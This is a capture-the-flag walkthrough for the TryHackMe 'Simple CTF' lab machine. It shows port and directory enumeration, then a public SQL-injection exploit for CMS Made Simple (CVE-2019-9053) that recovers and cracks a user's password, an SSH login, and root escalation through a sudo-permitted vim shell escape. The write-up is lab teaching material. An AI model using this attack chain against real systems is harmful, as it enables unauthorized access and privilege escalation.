# Simple CTF
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

Compromise the machine and read the user.txt and root.txt.

Tags
--
* CMS Made Simple
* CVE-2019-9053
* SQL Injection
* VIM privesc
* Sudoers

Tools used
--
* nmap
* ffuf
* CVE-2019-9053.py
* vim

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.52.78
* Other information must be gathered during the attack

Phase 1: Enumeration
--
```
sudo nmap -sS -sC -sV 10.10.52.78 -p- -T5 -vvv

<SNIP>
Discovered open port 80/tcp on 10.10.52.78
Discovered open port 2222/tcp on 10.10.52.78
Discovered open port 21/tcp on 10.10.52.78
<SNIP>
```
Use `ffuf`:
```
ffuf -u http://10.10.52.78/FFUF -H 'Host: 10.10.52.78' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Ge
cko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en
;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Sec-GPC: 1' -w /usr/sh
are/payloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FFUF

simple                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 40ms]
```
Let's go deep on it:
```
ffuf -u http://10.10.52.78/simple/FFUF -H 'Host: 10.10.52.78' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Ge
cko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en
;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Sec-GPC: 1' -w /usr/sh
are/payloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FFUF

modules                 [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 39ms]
uploads                 [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 39ms]
doc                     [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 39ms]
admin                   [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 173ms]
assets                  [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 39ms]
lib                     [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 39ms]
tmp                     [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 39ms]
```
Anyway, we see that the CMS used for this web application is CMS Made Simple.

Phase 2: Foothold
--
By looking at the bottom part of the home page, we see:
```
This site is powered by CMS Made Simple version 2.2.8
```
This version is vulnerable to SQL Injection: https://www.exploit-db.com/exploits/46635

Let's run the PoC exploit taken by the link (run it as Python2). For first let's install `pip` and `requests` and `termcolor` modules for Python2:
```
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
sudo python2 get-pip.py
pip2 install requests termcolor
```
Then, run the exploit:
```
python2 exploit.py -u http://10.10.52.78/simple --crack -w rockyou.txt

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```
Let's use this account for accessing by SSH:
```
ssh 10.10.52.78 -l mitch -p 2222
```
When we accessed, we can get immediately the user flag by `cat user.txt`.

Phase 3: Privilege Escalation
--
Execute:
```
sudo -l

User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```
We can use `vim` for spawning a privileged shell:
```
sudo /usr/bin/vim
```
On VIM environment, run:
```
:!cat /root/root.txt
```
and press Enter. You will get the root flag.